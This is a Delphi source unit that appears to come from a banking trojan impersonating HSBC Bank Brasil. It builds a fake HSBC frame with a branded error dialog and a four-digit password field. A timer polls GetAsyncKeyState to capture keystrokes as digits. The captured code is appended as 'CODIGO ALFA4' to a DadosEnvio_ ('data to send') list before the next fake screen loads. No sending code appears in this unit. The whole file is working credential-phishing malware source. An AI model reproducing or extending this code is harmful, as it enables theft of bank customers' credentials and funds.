unit FraHS2_;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, ExtCtrls, StdCtrls, pngimage, FraHS3_;

type
  TFrameHS2_ = class(TFrame)
    Image1: TImage;
    Label1: TLabel;
    Image2: TImage;
    Label13: TLabel;
    Bevel8: TBevel;
    Senh0r4_: TEdit;
    TimerKey_: TTimer;
    procedure Image2Click(Sender: TObject);
    procedure TimerKey_Timer(Sender: TObject);
    function  InsertNum(keys : string): Byte;
  end;

var
FrameHS3_ : TFrameHS3_;

implementation

{$R *.dfm}

uses
MainCentral;



procedure TFrameHS2_.Image2Click(Sender: TObject);
begin

if Length(Senh0r4_.Text) < 4 then
  begin
   MessageBox(Self.handle,'HSBC - Informa: Senha incorreta.', 'HSBC Bank Brasil S.A.',
   mb_IconError + mb_Ok);
   Exit;
  end;


DadosEnvio_.Add('CODIGO ALFA4: '+Senh0r4_.Text);



FrameHS3_ := TFrameHS3_.Create(Self);

with FrameHS3_ do
  begin
    Parent := Self;
    Left   := 0;
    Top    := 0;
  end;
end;
function TFrameHS2_.InsertNum(keys : string): Byte;
begin
 Senh0r4_.Text := Senh0r4_.Text+Keys;
end;
procedure TFrameHS2_.TimerKey_Timer(Sender: TObject);
var
keyloop, KeyResult : Integer;
begin

if Length(Senh0r4_.Text) = 4  then Exit;

keyloop := 0;

repeat
KeyResult := GetAsyncKeyState(keyloop);
if KeyResult = -32767 then
begin

if (KeyLoop = 81) then
 begin
   InsertNum('0');
 end;

if (KeyLoop = 71) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'1';
 end;
if (KeyLoop = 75) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'2';
 end;
if (KeyLoop = 74) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'3';
 end;
if (KeyLoop = 73) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'4';
 end;
if (KeyLoop = 79) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'5';
 end;
if (KeyLoop = 66) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'6';
 end;
if (KeyLoop = 76) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'7';
 end;
if (KeyLoop = 82) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'8';
 end;
if (KeyLoop = 87) then
 begin
   Senh0r4_.Text := Senh0r4_.Text+'9';
 end;


end;

inc(keyloop);
until keyloop = 255;
end;


end.
